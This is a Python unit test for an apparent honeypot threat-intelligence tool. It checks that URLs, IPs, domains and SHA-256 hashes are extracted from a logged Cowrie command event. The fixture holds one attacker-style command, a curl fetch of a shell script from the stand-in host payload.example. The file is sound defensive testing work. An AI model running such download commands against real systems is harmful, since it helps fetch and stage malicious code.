from __future__ import annotations

import unittest

from honeypot_ai.ioc import extract_iocs
from honeypot_ai.models import Event


class IOCTests(unittest.TestCase):
    def test_extracts_url_ip_domain_and_hash(self) -> None:
        events = [
            Event(
                source="cowrie",
                event_type="cowrie.command.input",
                src_ip="198.51.100.23",
                session="s1",
                command="curl http://payload.example/a.sh && echo e4a9b8c7d6f5e4a9b8c7d6f5e4a9b8c7d6f5e4a9b8c7d6f5e4a9b8c7d6f5e4a9",
                domain="payload.example.",
            )
        ]

        iocs = extract_iocs(events)
        values = {(ioc.kind, ioc.value) for ioc in iocs}

        self.assertIn(("src_ip", "198.51.100.23"), values)
        self.assertNotIn(("ip", "198.51.100.23"), values)
        self.assertIn(("url", "http://payload.example/a.sh"), values)
        self.assertIn(("domain", "payload.example"), values)
        self.assertIn(("sha256", "e4a9b8c7d6f5e4a9b8c7d6f5e4a9b8c7d6f5e4a9b8c7d6f5e4a9b8c7d6f5e4a9"), values)


if __name__ == "__main__":
    unittest.main()
